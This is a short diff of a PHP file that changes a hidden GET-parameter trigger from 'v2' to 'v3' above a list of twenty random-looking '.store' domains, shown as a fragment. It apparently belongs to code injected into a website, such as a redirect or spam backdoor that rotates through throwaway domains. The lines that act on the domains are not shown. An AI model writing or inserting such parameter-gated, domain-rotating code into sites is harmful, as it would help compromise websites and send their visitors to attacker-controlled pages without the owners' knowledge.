@@ -1,4 +1,4 @@
-<?php if(isset($_GET['v2']) && $_GET['v2'] != '') {
+<?php if(isset($_GET['v3']) && $_GET['v3'] != '') {
 
     $domains = array('kustover.store', 'gadadsdfs.store', 'iobeasto.store', 'jollibekoilop.store', 'onesunwithme.store', 'popzeronickkkk.store', 'sunnyfacein.store', 'testdopioi.store', 'uipoasto.store', 'zeronickkkk.store', 'golingol.store', 'holipouy.store', 'ifkolistaho.store', 'joilopstok.store', 'joliahort.store', 'kiuyilop.store', 'koinbeoilop.store', 'molistrojok.store', 'rafffoptik.store', 'sneakkondaho.store'); 
     $count_domains = count($domains) - 1;
